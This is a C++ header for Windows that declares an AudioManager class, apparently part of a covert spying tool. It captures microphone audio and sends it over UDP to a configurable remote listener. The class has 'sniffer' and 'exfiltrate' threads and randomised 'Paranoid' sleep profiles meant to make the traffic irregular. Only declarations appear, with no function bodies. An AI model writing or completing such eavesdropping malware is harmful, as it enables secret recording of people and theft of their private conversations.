#pragma once
#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <random>
#include <iostream>
#include <algorithm>
#include <initguid.h>  
#include <functiondiscoverykeys_devpkey.h>
#include <comutil.h>
#include <comdef.h>
#pragma comment(lib, "ws2_32.lib")

enum SleepProfile {
	Short = 0,
	Normal = 1,
	Long = 2,
	Paranoid = 3,
	ReallyRandom = 4
};

class AudioManager {
private:
	SOCKET udpSocket = INVALID_SOCKET;
	sockaddr_in serverAddr;
	bool socketInitialized = false;
	std::wstring targetDeviceId;

public:
	std::vector<char> globalAudioBuffer;
	int packetSize;
	std::mutex bufferMutex;
	bool bRunning = true;
	std::thread sniffer, exfilThread;
	std::random_device rd;
	std::mt19937 gen{ rd() }; 
	std::uniform_real_distribution<float> dist{ 6.0f, 30.0f };


	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioClient* pAudioClient = NULL;
	IAudioCaptureClient* pCaptureClient = NULL;
	WAVEFORMATEX* pwfx = NULL;

	void AudioSniffer();
	void Exfiltrate();
	bool Initialize();
	void Release();
	void LaunchSnifferThread();
	void Start();
	void Stop();
	void SetSleepMode(int mode);
	std::vector<std::wstring> GetMicrophones();
	void SetPacketSize(int size);
	void ListMicrophones();
	void SelectMicrophoneFromInt(int micIndex);
	void RandomSleep();
	void SetListener(std::string ip_address, int port);
};
